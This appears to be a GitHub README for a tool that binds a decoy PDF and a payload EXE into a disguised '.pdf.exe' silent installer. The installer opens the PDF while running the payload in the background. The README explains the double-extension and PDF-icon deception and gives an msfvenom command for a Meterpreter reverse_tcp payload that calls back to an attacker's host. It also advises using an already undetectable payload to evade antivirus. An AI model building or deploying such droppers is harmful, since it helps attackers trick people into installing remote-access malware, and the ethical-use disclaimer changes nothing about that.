# 📦 PDF-EXE SFX Builder

A cross-platform Python tool to bundle a **decoy PDF** and a **payload EXE** into a single `.pdf.exe` Windows executable using NSIS (Nullsoft Scriptable Install System). On execution, the final file silently drops both files into the temporary directory and runs them — showing the PDF while triggering the EXE.

---

## 🚀 Features

* Automatically binds a PDF and EXE into one executable.
* Uses `.pdf.exe` **double extension** for deception.
* Works on **Windows and Linux**.
* Embeds a **PDF icon** to appear trustworthy.
* Creates **silent installers** using NSIS.
* **Customizable icon** — just replace `pdf_icon.ico` in the repo with your own `.ico` file.

---

## 🎭 How Deception Works

### 🧠 Double Extension Tactic (`filename.pdf.exe`)

On most systems:

* The default setting hides known extensions.
* A file named `document.pdf.exe` appears as `document.pdf` to the user.
* The icon shows a PDF symbol — making it more believable.

🛑 **This is a common social engineering trick used by attackers**, so ensure your use is ethical and educational.

---

## 💡 Example Use Case: Meterpreter or PowerShell Payload

### 1. Generate Payload with `msfvenom`

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > payload.exe
```

### 2. Or Convert PowerShell Script to EXE

Use tools like:

* [ps2exe](https://github.com/MScholtes/PS2EXE)
* IExpress

Then use that `.exe` with this builder.

---

## 🛠️ Prerequisites

### ✅ For Windows:

* Python 3.x
* `nsis/makensis.exe` must be present in the project (portable NSIS included)

### ✅ For Linux:

```bash
sudo apt update
sudo apt install nsis python3
```

Make sure `makensis` is available at `/usr/bin/makensis`

---

## 📂 Project Structure

```
pdf-exe-sfx-builder/
├── nsis/
│   └── makensis.exe        # (Windows only)
├── pdf_icon.ico            # PDF icon for deception (can be replaced to change output icon)
├── pdf_builder.py        # Main script
└── README.md
```

---

## ⚙️ Usage

```bash
python pdf_builder.py <path_to_pdf> <path_to_exe> <output_name>
```

### Example:

```bash
python pdf_builder.py report.pdf payload.exe final_output
```

📦 This generates: `final_output.pdf.exe`

---

## 🧰 What Happens Internally

1. A temp directory is created.
2. PDF and EXE are copied there.
3. An `.nsi` script is generated.
4. NSIS bundles them into a final silent installer.
5. That installer, when run:

   * Extracts both files to `%TEMP%`
   * Opens the PDF (for cover)
   * Executes the payload EXE (in background)

---

## ⚠️ Antivirus Evasion Notice

This tool **does not make your payload FUD (Fully Undetectable)** by default.

* Meterpreter `.exe` or standard PowerShell-based payloads generated via tools like `msfvenom` or `ps2exe` are typically flagged by antivirus software.
* To avoid detection, you must use a custom or obfuscated payload that is already FUD.
* This builder only packages and disguises your existing EXE; it does not modify or encrypt its behavior.

Use with caution, and always test in a safe, isolated environment.

---

## 🔐 Disclaimer

This tool is created **for educational and ethical penetration testing** purposes only.

> Never use this tool to target devices or individuals without proper authorization. The misuse of this software can lead to serious legal consequences.

---

## 🤝 Credits

Developed by **RITVIJ GAUR** aka *superflex*, part of the **HackingFlix** community.

Pull requests welcome. Star the repo if you find it useful! ⭐
